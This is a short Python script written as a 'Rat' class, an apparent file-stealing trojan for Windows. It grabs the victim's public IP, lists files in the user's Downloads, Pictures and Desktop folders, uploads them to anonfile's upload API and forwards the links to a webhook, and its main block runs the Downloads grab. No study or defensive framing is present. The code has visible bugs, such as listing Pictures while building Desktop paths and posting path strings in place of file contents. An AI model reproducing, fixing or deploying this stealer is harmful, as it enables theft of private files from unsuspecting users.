import os, requests

class Rat:
    def __init__(self, attack: bool):
        self.attack = attack
        self.session = requests.Session()
        self.webhook = "what else my guy"

    def grabIp(self):
        return self.session.get('https://ip.42.pl/raw').text

    def grabDesktop(self):
        if self.attack:
            for i in os.listdir(f'C:\\Users\\{os.getenv("USERNAME")}\\Pictures'):
                if '.' not in i:
                    pass
                else:
                    data = {'file': f'C:\\Users\\{os.getenv("USERNAME")}\\Desktop\\{i}'}
                    r = self.session.post('https://api.anonfile.com/upload', files=data)
                    payload = {'content': f"`{r.text}`"}
                    self.session.post(self.webhook, json=payload)
    def grabDownloads(self):
        if self.attack:
            for i in os.listdir(f'C:\\Users\\{os.getenv("USERNAME")}\\Downloads'):
                if '.' not in i:
                    pass
                else:
                    data = {'file': f'C:\\Users\\{os.getenv("USERNAME")}\\Downloads\\{i}'}
                    r = self.session.post('https://api.anonfile.com/upload', files=data)
                    payload = {'content': f"`{r.text}`"}
                    self.session.post(self.webhook, json=payload)

if __name__ == '__main__':
    #Rat(True).grabDesktop()
    Rat(True).grabDownloads()